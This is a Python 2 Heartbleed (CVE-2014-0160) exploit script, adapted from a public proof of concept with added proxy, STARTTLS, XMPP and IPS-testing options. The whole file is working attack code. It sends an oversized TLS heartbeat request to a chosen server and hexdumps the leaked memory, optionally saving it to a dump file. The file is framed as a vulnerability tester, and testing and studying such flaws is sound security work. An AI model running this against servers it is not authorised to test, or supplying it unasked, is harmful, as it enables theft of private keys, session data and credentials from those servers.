#!/usr/bin/env python2

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
#
# tintinweb | https://github.com/tintinweb
# added proxy CONNECT support
# added HB packet variation for IPS testing
# added valid HB message padding (without HMAC)
# added options for custom HeartBeat.len, payload, fixed size TLSRecord.len, padding
#
# added some features of other gists (see options for credits)
#

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
options.add_option('-r', '--proxy', action='store', type='string', default="", help='Use Proxy server for connection (CONNECT)')
options.add_option('-l', '--hblen', type='int', default=0x4000, help='Heartbeat: defined payload lenth (>=4073)')
options.add_option('-o', '--hbload', action='store', type='string', default='', help='Heartbeat: payload')
options.add_option('-A', '--nofixtlslen', action='store_true', default=False, help='Do not autofix TLS Record Length')
options.add_option('-P', '--nopadding', action='store_true', default=False, help='Do not add HBMessage padding')
options.add_option('--tls10', action='store_true', default=False, help='use tls 1.0 (default: tls 1.1)')
options.add_option('-x', '--xmpp', action='store_true', default=False, help='Check XMPP STARTTLS')		# taken from: https://gist.github.com/tahajahangir/10396581
options.add_option('-t', '--hostname', dest='hostname', help='Use given host name in XMPP,Proxy CONNECT') # --""--
options.add_option('--dump-file', default='', help='dump file filename (default:response.dat')			  # --""--

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

"""
SAMPLE:
hb = h2bin('''
18 03 02 00 03
01 40 00
''')
"""



def build_hb(htype=0x01, length=0x4000, payload="A", nofixtlslen=False, nopadding=False, tls_version="1.1"):
    '''
    REF: https://tools.ietf.org/html/rfc6520
       struct {
              HeartbeatMessageType type;                //0x01 request, 0x02 response, 0x03-0xff reserved
              uint16 payload_length;                    //len(payload)
              opaque payload[HeartbeatMessage.payload_length];    //payload data
              opaque padding[padding_length];                     //padding
       } HeartbeatMessage;
    
    '''
    tls={
        'version':
            {
            '1.0':0x301,		
            '1.1':0x302,
            },
        }
			
    if length>0x4000:
        print "[ *] [TCP] [TLS] [HB]! HBLength is greater than max. TLS fragment size (16K). Do not expect responses > 16K from the server.\n"
    print "[ *] [TCP] [TLS] [HB] creating TLS (v%s) HB packet: type=0x%x length=0x%x (%u) payload=%s (len:%u)"%(tls_version,htype,length,length,repr(payload),len(payload))
    sys.stdout.flush()
    # build hb packet w type, with defined length and payload
    p = ""

    #p+= h2bin("18 03 02 00 03")        # SSL TLS1
    p+= struct.pack("!B",0x18)          # TLS: Content-type: heartbeat

    p+= struct.pack("!H",tls['version'].get(tls_version))        # Version: default TLS 1.1
                                        # record length: len(htype)+len(length)+len(payload)
                                        
    tlslen=1+2       
    padding = ''                        # minimum of 16bytes padding           
                                        # padding TLSPlaintext.length - payload_length - 3    
    if not nofixtlslen:
        tlslen+=len(payload)
        
        if not nopadding:
            padd_len = tlslen-len(payload) -3
            if padd_len <16:
                padd_len = 16           # padd min
            
            tlslen+=padd_len
            padding = 'P'*padd_len
    else:
        print "[ *] [TCP] [TLS] not fixing TLS.record.length!"
    print "[ *] [TCP] [TLS] TLS.record.length = %s"%tlslen
    sys.stdout.flush()
        
    p+= struct.pack("!H",tlslen)        #tls.record.length
            
    p+= struct.pack("!B",htype)         #heartbeat type: 1=message
    p+= struct.pack("!H",length)        #payload length
    p+= payload
    p+= padding
    print "[ *] [TCP] sending: "
    hexdump_squashed(p)

    return p



def hexdump_squashed(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        if hxdat == "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00":
            if allnulls == 1:
                continue
            hxdat = '...'
            allnulls = 1
            pdat = ''
        else:
            pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
            allnulls = 0
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print



def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay

def hit_hb(s, hb, opts):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print '[ *] [TCP] [TLS?] No heartbeat response received, server likely not vulnerable'
            return False

        if typ == 24:
            print 'Received heartbeat response:'
            hexdump_squashed(pay)
            if len(opts.dump_file):
                with open(opts.dump_file, "a") as dump:
                     dump.write(pay)
            if len(pay) > 3:
                print '[ *] [TCP] [TLS] WARNING: server returned more data than it should - server is vulnerable!'
            else:
                print '[ *] [TCP] [TLS] Server processed malformed heartbeat, but did not return any extra data.'
            return True

        if typ == 21:
            print 'Received alert:'
            hexdump_squashed(pay)
            print '[ *] [TCP] [TLS] Server returned error, likely not vulnerable'
            return False

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



    if len(opts.proxy):
        ip,port = opts.proxy.split(":")
        port=int(port)
    else:
        ip = args[0]
        port=opts.port

    print "[ *] [TCP] Connecting.. %s:%s"%(ip,port)
    sys.stdout.flush()
    s.connect((ip,port))

    print "[ *] [TCP] Connection successful (tcp)!"
    if opts.starttls:
        re = s.recv(4096)
        if opts.debug: print re
        s.send('ehlo starttlstest\n')
        re = s.recv(1024)
        if opts.debug: print re
        if not 'STARTTLS' in re:
            if opts.debug: print re
            print '     [STARTTLS] STARTTLS not supported...'
            sys.exit(0)
        s.send('starttls\n')
        re = s.recv(1024)

    if len(opts.proxy):
        hoststr="%s:%s"%(opts.hostname or args[0],opts.port)
        connect = 'CONNECT %s HTTP/1.1\nUser-Agent: hbtest\nProxy-Connection: keep-alive\nConnection: keep-alive\nHost: %s\n\n'%(hoststr,hoststr)
        if opts.debug:
            print connect
        s.send(connect)
        re = s.recv(1024)
        if not "HTTP/1.1 200 Connection established".lower() in re.lower():
            print "     [PROXY] ERROR - response: %s"%re
        else:
            print re
			
    if opts.xmpp:
        s.send('<stream:stream xmlns="jabber:client" version="1.0" xmlns:stream="http://etherx.jabber.org/streams" to="%s">' % (opts.hostname or args[0]))
        re = s.recv(4096)
        while not '<stream:features' in re:
            if opts.debug: print re
            re = s.recv(4096)
        if opts.debug: print re
        if not 'urn:ietf:params:xml:ns:xmpp-tls' in re:
            print '     [XMPP] STARTTLS not supported...'
            sys.exit(0)
        s.send('<starttls xmlns="urn:ietf:params:xml:ns:xmpp-tls"/>')
        re = s.recv(4096)
        if opts.debug: print re

    print '[ *] [TCP] [TLS] Sending Client Hello...'
    sys.stdout.flush()
    
    import layer.ssl.tls as x
    hello = x.TLSRecord(version=0x0301, content_type=0x16)/x.TLSHandshake(version=0x0302)
    hello=x.serialize(hello)
    hexdump_squashed(hello)
    
    s.send(hello)
    print '[ *] [TCP] [TLS] Waiting for Server Hello...'
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print '[ *] [TCP] Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    print '[ *] [TCP] [TLS] Sending heartbeat request...'
    sys.stdout.flush()

    tls_version="1.0" if opts.tls10 else "1.1"
    
    #
    #hb = build_hb(length=opts.hblen, payload=opts.hbload, nofixtlslen=opts.nofixtlslen, nopadding=opts.nopadding, tls_version=tls_version)
  
    hb = x.TLSRecord(version=0x0302)/x.TLSHeartBeat( payload_length=0x4000)
    hb = x.serialize(hb)
    hexdump_squashed(hb)
    opts.debug=True
    s.send(hb)
    hit_hb(s,hb, opts)

if __name__ == '__main__':
    main()
